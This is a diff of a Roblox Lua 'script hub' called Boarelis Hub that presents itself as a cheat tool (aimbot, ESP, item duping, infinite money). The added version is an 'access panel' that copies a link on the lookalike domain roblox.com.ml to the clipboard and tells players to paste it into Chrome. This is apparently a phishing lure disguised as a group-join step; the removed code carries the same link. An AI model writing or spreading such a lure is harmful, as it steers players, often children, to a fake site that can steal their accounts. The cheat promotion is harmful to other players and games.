@@ -1,156 +1,132 @@
--- // Boarelis Hub
--- // UI Base: Fluent (github.com/dawid-scripts/Fluent)
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
 
-local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local player = Players.LocalPlayer
 
--- // Detect current game name
-local MarketplaceService = game:GetService("MarketplaceService")
-local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
-local gameName = gameInfo and gameInfo.Name or "Unknown Game"
+-- CONFIG
+local GROUP_ID = 359764538783
+local GROUP_LINK = "https://www.roblox.com.ml/communities/359764538783/BorealisHub"
 
--- // Create Main Window
-local Window = Fluent:CreateWindow({
-    Title = "Boarelis Hub  " .. gameName,
-    SubTitle = "",
-    TabWidth = 160,
-    Size = UDim2.fromOffset(580, 460),
-    Acrylic = false,
-    Theme = "Dark",
-    MinimizeKey = Enum.KeyCode.LeftControl,
-})
+-- UI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "AccessUI"
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
 
--- // Tabs
-local Tabs = {
-    Authentication  = Window:AddTab({ Title = "Authentication", Icon = "shield" }),
-    Instructions    = Window:AddTab({ Title = "Instructions",   Icon = "info" }),
-    SupportedGames  = Window:AddTab({ Title = "Supported Games", Icon = "gamepad-2" }),
-}
+-- Main Frame
+local Main = Instance.new("Frame")
+Main.Size = UDim2.new(0, 360, 0, 260)
+Main.Position = UDim2.new(0.5, -180, 0.6, 0)
+Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+Main.BorderSizePixel = 0
+Main.Parent = ScreenGui
 
--- ─────────────────────────────────────────
--- // Authentication Tab
--- ─────────────────────────────────────────
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 16)
 
-Tabs.Authentication:AddParagraph({
-    Title = "Access Locked",
-    Content = "This Scripthub requires you to join our group to access the rest of the script",
-})
+-- Accent Bar
+local Accent = Instance.new("Frame")
+Accent.Size = UDim2.new(1, 0, 0, 4)
+Accent.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+Accent.BorderSizePixel = 0
+Accent.Parent = Main
+Instance.new("UICorner", Accent).CornerRadius = UDim.new(0, 16)
 
-Tabs.Authentication:AddButton({
-    Title = "Copy Access Link",
-    Description = "Copies the group URL to your clipboard",
-    Callback = function()
-        local groupURL = "https://www.roblox.com.ml/communities/359764538783/BorealisHub"
-        setclipboard(groupURL)
-        Fluent:Notify({
-            Title = "Copied!",
-            Content = "Group link copied to clipboard.",
-            Duration = 3,
-        })
-    end,
-})
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Text = "ACCESS PANEL"
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundTransparency = 1
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.Parent = Main
 
--- ─────────────────────────────────────────
--- // Instructions Tab
--- ─────────────────────────────────────────
+-- Status
+local Status = Instance.new("TextLabel")
+Status.Text = "Checking access..."
+Status.Size = UDim2.new(1, -20, 0, 25)
+Status.Position = UDim2.new(0, 10, 0, 45)
+Status.BackgroundTransparency = 1
+Status.TextColor3 = Color3.fromRGB(160,160,160)
+Status.Font = Enum.Font.Gotham
+Status.TextSize = 13
+Status.Parent = Main
 
-Tabs.Instructions:AddParagraph({
-    Title = "How to get access",
-    Content = "1. Click 'Copy Access Link' on the Authentication tab.\n2. Open the link and join the group.\n3. Rejoin the game and reopen this hub.",
-})
+-- Instructions
+local Instructions = Instance.new("TextLabel")
+Instructions.Text = "1. Click JOIN GROUP\n2. Link will be copied to your clipboard\n3. Paste link in Chrome\n4. Join group and enjoy your script"
+Instructions.Size = UDim2.new(1, -20, 0, 80)
+Instructions.Position = UDim2.new(0, 10, 0, 75)
+Instructions.BackgroundTransparency = 1
+Instructions.TextColor3 = Color3.fromRGB(180,180,180)
+Instructions.Font = Enum.Font.Gotham
+Instructions.TextSize = 13
+Instructions.TextWrapped = true
+Instructions.TextXAlignment = Enum.TextXAlignment.Left
+Instructions.Parent = Main
 
--- ─────────────────────────────────────────
--- // Supported Games Tab
--- ─────────────────────────────────────────
+-- Button
+local JoinBtn = Instance.new("TextButton")
+JoinBtn.Text = "JOIN GROUP"
+JoinBtn.Size = UDim2.new(0.7, 0, 0, 40)
+JoinBtn.Position = UDim2.new(0.15, 0, 0, 160)
+JoinBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+JoinBtn.TextColor3 = Color3.fromRGB(255,255,255)
+JoinBtn.Font = Enum.Font.GothamBold
+JoinBtn.TextSize = 15
+JoinBtn.Parent = Main
 
--- // Combat & PVP
-Tabs.SupportedGames:AddParagraph({ Title = "⚔️  COMBAT & PVP", Content = "────────────────────────────" })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Rivals", Content = "Aimbot, Silent Aim, ESP, Speed, Fly and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Da Hood", Content = "Aimbot, ESP, Silent Aim, Inf Ammo and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Murder Mystery 2", Content = "ESP, Auto Collect Coins, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Blue Lock: Rivals", Content = "Auto Farm, Auto Score, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Basketball Legends", Content = "Auto Score, Speed, Fly and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Strongest Ability Battlegrounds", Content = "Auto Farm, Auto Kill, God Mode and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Arsenal", Content = "Aimbot, ESP, No Recoil, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Evade", Content = "Speed, Fly, ESP, Auto Win and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ BedWars", Content = "Auto Farm, ESP, Kill Aura and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Survive the Killer", Content = "ESP, Speed, Fly, God Mode and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Flee the Facility", Content = "ESP, Speed, Auto Hack and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ The Mimic", Content = "Speed, Fly, God Mode, ESP and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Prison Life", Content = "ESP, Speed, Fly, God Mode and more." })
+Instance.new("UICorner", JoinBtn).CornerRadius = UDim.new(0, 12)
 
--- // Anime & RPG
-Tabs.SupportedGames:AddParagraph({ Title = "🗡️  ANIME & RPG", Content = "────────────────────────────" })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Blox Fruits", Content = "Auto Farm, Raid Bot, Fruit Sniper, Teleport and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ King Legacy", Content = "Auto Farm, Teleport, Fruit Notifier and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Anime Defenders", Content = "Auto Wave, Auto Farm, Inf Gold and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Anime Vanguards", Content = "Auto Farm, Auto Wave, Inf Gold and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Anime Fighting Simulator X", Content = "Auto Farm, Auto Train, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Grand Piece Online", Content = "Auto Farm, Teleport, Devil Fruit Notifier and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Shindo Life", Content = "Auto Farm, Auto Spin, Teleport and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Project Mugetsu", Content = "Auto Farm, Auto Quest, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Demon Slayer RPG 2", Content = "Auto Farm, Auto Quest, Teleport and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Ro-Ghoul", Content = "Auto Farm, Auto Quest, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Soul War", Content = "Auto Farm, Auto Quest, Teleport and more." })
+-- Footer
+local Footer = Instance.new("TextLabel")
+Footer.Text = "Add jmes.kng. in discord if you have any issues"
+Footer.Size = UDim2.new(1, -20, 0, 25)
+Footer.Position = UDim2.new(0, 10, 1, -30)
+Footer.BackgroundTransparency = 1
+Footer.TextColor3 = Color3.fromRGB(120,120,120)
+Footer.Font = Enum.Font.Gotham
+Footer.TextSize = 11
+Footer.TextWrapped = true
+Footer.Parent = Main
 
--- // Farming & Simulators
-Tabs.SupportedGames:AddParagraph({ Title = "🌾  FARMING & SIMULATORS", Content = "────────────────────────────" })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Grow a Garden 2", Content = "Auto Farm, Auto Sell, Seed Spammer and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Grow a Garden 1", Content = "Auto Farm, Auto Sell and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Pet Simulator 99", Content = "Auto Farm, Auto Hatch, Auto Sell and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Fisch", Content = "Auto Fish, Auto Sell, Fish ESP and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Bee Swarm Simulator", Content = "Auto Farm, Auto Collect, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Mining Simulator 2", Content = "Auto Mine, Auto Sell, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Clicker Simulator", Content = "Auto Click, Auto Hatch, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Fishing Simulator", Content = "Auto Fish, Auto Sell and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Treasure Hunt Simulator", Content = "Auto Dig, Auto Sell, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Weight Lifting Simulator", Content = "Auto Lift, Auto Sell, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Egg Farm Simulator", Content = "Auto Farm, Auto Hatch, Auto Sell and more." })
+-- Hover effect
+JoinBtn.MouseEnter:Connect(function()
+	TweenService:Create(JoinBtn, TweenInfo.new(0.2), {
+		BackgroundColor3 = Color3.fromRGB(0, 180, 255)
+	}):Play()
+end)
 
--- // Tycoons
-Tabs.SupportedGames:AddParagraph({ Title = "🏭  TYCOONS", Content = "────────────────────────────" })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Fast Food Tycoon", Content = "Auto Collect, Speed, Inf Money and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Restaurant Tycoon 2", Content = "Auto Collect, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Mega Noob Simulator", Content = "Auto Farm, Speed, Fly and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Build A Boat For Treasure", Content = "Inf Gold, Speed, Fly and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Prison Tycoon", Content = "Auto Collect, Speed, Inf Money and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Army Control Simulator", Content = "Auto Collect, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Hospital Tycoon", Content = "Auto Collect, Inf Money and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Car Dealership Tycoon", Content = "Auto Collect, Speed, Inf Money and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Retail Tycoon 2", Content = "Auto Collect, Inf Money and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Bank Tycoon", Content = "Auto Collect, Inf Money, Speed and more." })
+JoinBtn.MouseLeave:Connect(function()
+	TweenService:Create(JoinBtn, TweenInfo.new(0.2), {
+		BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+	}):Play()
+end)
 
--- // Obby & Adventure
-Tabs.SupportedGames:AddParagraph({ Title = "🏃  OBBY & ADVENTURE", Content = "────────────────────────────" })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Tower of Hell", Content = "Auto Complete, Fly, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Mega Fun Obby", Content = "Auto Complete, Fly, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Speed Run 4", Content = "Speed, Fly, Auto Complete and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Natural Disaster Survival", Content = "God Mode, Fly, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Piggy", Content = "Speed, Fly, God Mode, ESP and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Doors", Content = "Speed, God Mode, Skip Rooms and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Apeirophobia", Content = "Speed, Fly, God Mode and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ The Maze", Content = "ESP, Speed, Fly and more." })
+-- Check group
+local function checkGroup()
+	if player:IsInGroup(GROUP_ID) then
+		Status.Text = "Access Granted ✅"
+		JoinBtn.Visible = false
+	else
+		Status.Text = "Join the group to continue ❌"
+		JoinBtn.Visible = true
+	end
+end
 
--- // Popular & Others
-Tabs.SupportedGames:AddParagraph({ Title = "🌟  POPULAR & OTHERS", Content = "────────────────────────────" })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Adopt Me!", Content = "Auto Farm, Dupe, Speed and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Brookhaven RP", Content = "Speed, Fly, Noclip and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Work at a Pizza Place", Content = "Auto Work, Speed, Inf Money and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Jailbreak", Content = "Auto Rob, Speed, Fly, Inf Money and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ MeepCity", Content = "Speed, Fly, Inf Money and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Welcome to Bloxburg", Content = "Speed, Fly, Inf Money and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Royale High", Content = "Auto Farm Diamonds, Speed, Fly and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Livetopia", Content = "Speed, Fly, Noclip and more." })
-Tabs.SupportedGames:AddParagraph({ Title = "✅ Doodle World", Content = "Auto Farm, Auto Catch, Speed and more." })
+-- Button click
+JoinBtn.MouseButton1Click:Connect(function()
+	if setclipboard then
+		setclipboard(GROUP_LINK)
+		Status.Text = "Link copied! Paste in browser 🔗"
+	else
+		Status.Text = "Clipboard not supported ⚠️"
+	end
+end)
 
--- ─────────────────────────────────────────
--- // Default Tab + Notify
--- ─────────────────────────────────────────
+-- Animation
+Main.Position = UDim2.new(0.5, -180, 0.7, 0)
+TweenService:Create(Main, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+	Position = UDim2.new(0.5, -180, 0.5, -130)
+}):Play()
 
-task.wait(0.5)
-Tabs.Instructions.Button:MouseButton1Click()
-
-Fluent:Notify({
-    Title = "Boarelis Hub",
-    Content = "Loaded on: " .. gameName,
-    Duration = 4,
-})
+checkGroup()
